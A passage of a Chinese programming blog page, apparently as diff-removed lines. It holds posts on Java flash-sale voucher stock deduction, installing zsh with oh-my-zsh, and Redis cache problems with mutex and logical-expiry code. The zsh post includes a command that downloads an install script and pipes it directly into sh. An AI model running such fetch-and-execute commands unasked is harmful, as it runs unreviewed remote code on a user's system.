(voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line"><span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 数据库锁 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 6.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 6.2 用户id</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 6.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意，如果条件判断是要库存和之前的库存相等，这样会导致<strong>成功率低</strong>，未卖出问题，即当100个请求进入时，其中一个请求先执行完修改了库存，剩余99个因为这个条件判断失败都不会执行，这样就会导致未卖出问题。</p>
-<p>所以这里使用了<code>gt(&quot;stock&quot;, 0)</code>，即库存大于0时才执行扣减库存操作。保证了实现卖完即止。</p>
-<p>注意，为什么不会存在库存为1，然后都修改的情况，因为这里的update是<strong>Mysql</strong>提供锁来进行隔离，不会存在都为1然后都修改的情况。</p>
-<h3 id="可优化方向"><a href="#可优化方向" class="headerlink" title="可优化方向"></a>可优化方向</h3><ul>
-<li><strong>数据库锁</strong>：使用数据库锁来保证数据的一致性，比如行锁、表锁、读锁、写锁等。</li>
-<li><strong>缓存</strong>：将库存数量缓存到Redis中，减少数据库的访问次数。</li>
-<li><strong>消息队列</strong>：使用消息队列来异步处理订单，减少数据库的压力。<br>…</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/17/linux%E4%B8%8B%E4%BD%BF%E7%94%A8zsh%E4%BB%A5%E5%8F%8Aoh-my-zsh/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/17/linux%E4%B8%8B%E4%BD%BF%E7%94%A8zsh%E4%BB%A5%E5%8F%8Aoh-my-zsh/" class="post-title-link" itemprop="url">linux下使用zsh以及oh-my-zsh</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-17 20:42:16 / Modified: 20:55:22" itemprop="dateCreated datePublished" datetime="2025-03-17T20:42:16+08:00">2025-03-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="切换shell"><a href="#切换shell" class="headerlink" title="切换shell"></a>切换shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
-
-<p>注意，需要重启终端才能生效。</p>
-<h2 id="不重启保持使用zsh"><a href="#不重启保持使用zsh" class="headerlink" title="不重启保持使用zsh"></a>不重启保持使用zsh</h2><p>打开preferences，找到profiles，选择command，将command改为<code>/bin/zsh</code>，然后重启终端。</p>
-<h2 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>找到<code>ZSH_THEME=&quot;robbyrussell&quot;</code>，可以修改主题，例如<code>ZSH_THEME=&quot;random&quot;</code>。</p>
-<p>要运行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>才能生效。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果windows默认shell是zsh该多好啊…</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/16/Redis-%E7%BC%93%E5%AD%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/16/Redis-%E7%BC%93%E5%AD%98/" class="post-title-link" itemprop="url">Redis-缓存</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-16 19:36:52 / Modified: 16:43:52" itemprop="dateCreated datePublished" datetime="2025-03-16T19:36:52+08:00">2025-03-16</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><p>Redis 全称 Remote Dictionary Server，即远程字典服务器。是一个基于内存的键值型NoSQL数据库，支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。Redis 是一个高性能的 key-value 存储系统，常用于缓存、消息队列、排行榜等场景。</p>
-<h2 id="Redis-特点"><a href="#Redis-特点" class="headerlink" title="Redis 特点"></a>Redis 特点</h2><ul>
-<li><strong>键值存储</strong>：Redis 是一个键值存储系统，支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。</li>
-<li><strong>单线程</strong>：Redis 是单线程的，通过非阻塞 I&#x2F;O 和事件驱动机制来实现高并发，每个命令具备原子性。</li>
-<li><strong>低延迟</strong>：Redis 通过将数据存储在内存中来实现低延迟。</li>
-<li><strong>持久化</strong>：Redis 支持 RDB 和 AOF 两种持久化方式，可以将内存中的数据持久化到磁盘中。</li>
-<li><strong>支持集群</strong>：Redis 支持主从复制、哨兵和集群等功能。</li>
-<li><strong>支持多语言</strong>：Redis 支持多种语言的客户端，如 Java、Python、Node.js 等。</li>
-</ul>
-<h2 id="Redis-安装"><a href="#Redis-安装" class="headerlink" title="Redis 安装"></a>Redis 安装</h2><p>官网下载地址：<a target="_blank" rel="noopener" href="https://redis.io/download">https://redis.io/download</a></p>
-<h2 id="Redis-命令"><a href="#Redis-命令" class="headerlink" title="Redis 命令"></a>Redis 命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure>
-
-<h2 id="Redis-缓存"><a href="#Redis-缓存" class="headerlink" title="Redis 缓存"></a>Redis 缓存</h2><h3 id="缓存作用模型"><a href="#缓存作用模型" class="headerlink" title="缓存作用模型"></a>缓存作用模型</h3><p><img src="/images/image6.png" alt="alt text"></p>
-<h3 id="缓存更新策略"><a href="#缓存更新策略" class="headerlink" title="缓存更新策略"></a>缓存更新策略</h3><p><img src="/images/image7.png" alt="alt text"></p>
-<h4 id="主动更新策略"><a href="#主动更新策略" class="headerlink" title="主动更新策略"></a>主动更新策略</h4><ol>
-<li>由缓存的调用者，在更新数据库的同时，更新缓存。</li>
-<li>将缓存和数据库整合为一个服务，由服务来维护统一性。</li>
-<li>调用者只操作缓存，由其他线程异步的将缓存数据持久化到数据库。</li>
-</ol>
-<p>一般采用第一种方案，即在更新数据库的同时，更新缓存。</p>
-<p>方案二会导致缓存和数据库的耦合度过高，不利于系统的扩展和维护。</p>
-<p>方案三会可能导致缓存数据和数据库数据不一致，不利于数据的一致性。</p>
-<h4 id="缓存更新策略的最佳实践方案"><a href="#缓存更新策略的最佳实践方案" class="headerlink" title="缓存更新策略的最佳实践方案"></a>缓存更新策略的最佳实践方案</h4><ol>
-<li>低一致性需求：使用Redis自带的内存淘汰机制</li>
-<li>高一致性需求：主动更新，并以超时剔除作为兜底策略</li>
-</ol>
-<p><img src="/images/image8.png" alt="alt text"></p>
-<ul>
-<li>读操作<ul>
-<li>缓存命中则直接返回</li>
-<li>缓存未命中则查询数据库，并写入缓存，设定超时时间</li>
-</ul>
-</li>
-<li>写操作<ul>
-<li>先写数据库，再删除缓存</li>
-<li>要确保数据库与缓存操作的原子性</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/image9.png" alt="alt text"></p>
-<p>ps. 缓存为快速操作，可能会在数据库写入之前读取到脏数据，造成线程安全问题;之所以不选择更新缓存，因为更新操作相比删除操作，会带来更多无用操作。</p>
-<h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透是指客户端请求的数据在缓存和数据库中都不存在，这样缓存永远不会命中，导致请求直接访问数据库，增加数据库的压力。</p>
-<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p><img src="/images/image10.png" alt="alt text"></p>
-<ol>
-<li><strong>缓存空对象</strong></li>
-</ol>
-<ul>
-<li>实现简单， 维护成本低</li>
-<li>额外的内存开销（可以设置较短的过期时间）</li>
-<li>可能造成短期的不一致（当有新的数据插入时，造成数据不一致）</li>
-</ul>
-<ol start="2">
-<li><strong>布隆过滤器</strong></li>
-</ol>
-<ul>
-<li>一个很长的二进制向量和一系列随机映射函数</li>
-<li>内存占用少，没有多余key</li>
-<li>有一定的误判率（不存在是真的不存在，存在是可能存在）</li>
-</ul>
-<ol start="3">
-<li><strong>增强id复杂度</strong></li>
-</ol>
-<ul>
-<li>对id进行加密，增加复杂度</li>
-<li>一定程度上可以防止穿透</li>
-</ul>
-<ol start="4">
-<li><strong>限流</strong></li>
-</ol>
-<ul>
-<li>限制请求频率，防止攻击</li>
-</ul>
-<p>一般在开发中，会使用第一种方案，即缓存空对象。</p>
-<p>流程图变化：</p>
-<p><img src="/images/image11.png" alt="alt text"></p>
-<h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>缓存雪崩是指缓存中的大量数据同时过期或者Redis服务宕机，导致请求直接访问数据库，增加数据库的压力。</p>
-<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
-<li><strong>缓存数据过期时间随机</strong></li>
-</ol>
-<ul>
-<li>给不同的key的TTL设置随机值，避免大量key同时过期</li>
-</ul>
-<ol start="2">
-<li><p><strong>多级缓存</strong></p>
-</li>
-<li><p><strong>Redis集群</strong></p>
-</li>
-</ol>
-<ul>
-<li>通过主从复制和哨兵机制，保证Redis的高可用性</li>
-</ul>
-<ol start="4">
-<li><strong>限流</strong></li>
-</ol>
-<p><img src="/images/image12.png" alt="alt text"></p>
-<h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p><img src="/images/image13.png" alt="alt text"></p>
-<p>缓存击穿问题也叫热点Key问题，是指一个被高并发访问且缓存重建业务较复杂的Key突然失效，导致大量请求瞬间访问数据库，增加数据库的压力。</p>
-<h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
-<li><strong>互斥锁</strong></li>
-</ol>
-<ul>
-<li>在缓存失效的时候，使用互斥锁，只允许一个线程访问数据库，其他线程等待</li>
-<li>适用于缓存失效后，数据重建时间较短的情况</li>
-</ul>
-<ol start="2">
-<li><strong>逻辑过期</strong></li>
-</ol>
-<ul>
-<li>设置一个逻辑上不会过期的缓存，当逻辑过期时，重新设置缓存</li>
-<li>某个线程设置缓存时，其他线程直接得到缓存数据，不考虑缓存是否过期</li>
-</ul>
-<p><img src="/images/image14.png" alt="alt text"></p>
-<p><img src="/images/image15.png" alt="alt text"></p>
-<p>使用互斥锁来解决：</p>
-<p><img src="/images/image16.png" alt="alt text"></p>
-<p>代码实现：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">queryById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">// 互斥锁解决缓存击穿</span></span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> queryWithMutex(id);</span><br><span class="line">    <span class="keyword">if</span> (shop == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;商铺不存在&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Result.ok(shop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 互斥锁解决缓存击穿</span></span><br><span class="line"><span class="keyword">public</span> Shop <span class="title function_">queryWithMutex</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> CACHE_SHOP_KEY + id;</span><br><span class="line">    <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">shopJson</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 如果缓存中有数据，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (StrUtil.isNotBlank(shopJson)) &#123; <span class="comment">// 是真实商铺数据才会进入if返回数据</span></span><br><span class="line">        <span class="keyword">return</span> JSONUtil.toBean(shopJson, Shop.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断命中的是否为空值</span></span><br><span class="line">    <span class="keyword">if</span> (shopJson != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 未命中 实现缓存重建</span></span><br><span class="line">    <span class="comment">// 获取互斥锁</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(LOCK_SHOP_KEY + id);</span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否获取成功</span></span><br><span class="line">        <span class="keyword">if</span> (!isLock) &#123;</span><br><span class="line">            <span class="comment">// 未获取到锁，休眠后重试</span></span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">return</span> queryWithMutex(id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 成功，从数据库中查询</span></span><br><span class="line">        shop = getById(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟重建的延时</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不存在，将空值写入缓存，防止缓存穿透</span></span><br><span class="line">        <span class="keyword">if</span> (shop == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 设置空值缓存 过期时间为2分钟</span></span><br><span class="line">            stringRedisTemplate.opsForValue().set(key, <span class="string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将查询到的数据写入缓存 设置过期时间</span></span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 释放互斥锁</span></span><br><span class="line">        unlock(LOCK_SHOP_KEY + id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 返回数据</span></span><br><span class="line">    <span class="keyword">return</span> shop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用逻辑过期来解决：</p>
-<p><img src="/images/image17.png" alt="alt text"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Shop <span class="title function_">queryWithLogicalExpire</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> CACHE_SHOP_KEY + id;</span><br><span class="line">    <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">shopJson</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 如果缓存中不存在数据，直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (StrUtil.isBlank(shopJson)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 命中，需要先把json反序列化为对象</span></span><br><span class="line">    <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> JSONUtil.toBean(shopJson, RedisData.class);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">data</span> <span class="operator">=</span> (JSONObject) redisData.getData();</span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> JSONUtil.toBean(data, Shop.class);</span><br><span class="line">    <span class="type">LocalDateTime</span> <span class="variable">expireTime</span> <span class="operator">=</span> redisData.getExpireTime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断是否过期</span></span><br><span class="line">    <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 4.1 未过期，直接返回信息</span></span><br><span class="line">        <span class="keyword">return</span> shop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 已过期，需要缓存重建</span></span><br><span class="line">    <span class="comment">// 5. 缓存重建</span></span><br><span class="line">    <span class="comment">// 5.1 获取互斥锁</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lockKey</span> <span class="operator">=</span> LOCK_SHOP_KEY + id;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(lockKey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否获取成功</span></span><br><span class="line">    <span class="keyword">if</span> (isLock) &#123;</span><br><span class="line">        <span class="comment">// 再次检查是否过期</span></span><br><span class="line">        <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">            <span class="comment">// 未过期，释放锁，直接返回</span></span><br><span class="line">            unlock(lockKey);</span><br><span class="line">            <span class="keyword">return</span> shop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 过期</span></span><br><span class="line">        <span class="comment">// 5.3 获取锁成功，开启独立线程，实现缓存重建(利用线程池)</span></span><br><span class="line">        CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 缓存重建</span></span><br><span class="line">                <span class="built_in">this</span>.saveShop2Redis(id, CACHE_SHOP_TTL);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 释放锁</span></span><br><span class="line">                unlock(lockKey);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.4 未成功，返回商铺信息（过期的数据）</span></span><br><span class="line">    <span class="keyword">return</span> shop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(key, <span class="string">&quot;1&quot;</span>, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">    <span class="keyword">return</span> BooleanUtil.isTrue(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    stringRedisTemplate.delete(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveShop2Redis</span><span class="params">(Long id, Long expireSeconds)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 1. 查询店铺信息</span></span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> getById(id);</span><br><span class="line">    Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 封装逻辑过期时间</span></span><br><span class="line">    <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RedisData</span>();</span><br><span class="line">    redisData.setData(shop);</span><br><span class="line">    redisData.setExpireTime(LocalDateTime.now().plusSeconds(expireSeconds));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 写入redis</span></span><br><span class="line">    stringRedisTemplate.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(redisData));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="封装缓存工具类"><a href="#封装缓存工具类" class="headerlink" title="封装缓存工具类"></a>封装缓存工具类</h3><p>代码如下：</p>
-<p>主要通过<strong>泛型</strong>和<strong>函数式编程</strong>来实现缓存工具的封装。</p>
